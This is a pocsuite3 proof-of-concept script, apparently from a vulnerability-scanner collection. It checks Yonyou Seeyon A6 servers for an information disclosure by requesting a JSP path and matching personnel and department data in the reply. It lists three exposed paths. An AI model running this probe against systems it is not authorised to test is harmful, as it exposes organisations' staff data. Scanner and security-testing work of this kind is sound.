#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''致远_A6_info_disclosure'''
    desc = '''泄漏路径：
/yyoa/assess/js/initDataAssess.jsp
/yyoa/common/SelectPerson/reloadData.jsp
/yyoa/ext/trafaxserver/SystemManage/config.jsp'''
    solution = ''''''
    severity = '''medium'''
    vulType = ''''''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''用友致远A6协同管理系统'''
    appVersion = '''*'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url,ip,port = parse_ip_port(self.target)
        # Write your code here
        action = "/yyoa/common/SelectPerson/reloadData.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
        }
        verify_url = make_verify_url(self.url, action, mod=0)
        resp = requests.get(verify_url, headers=headers, verify=False, timeout=15, allow_redirects=False)
        if resp.status_code == 200 and b"insertObject(myNode,new Node('" in resp.content and b"insertObject(myDeparment,new Deparment('" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
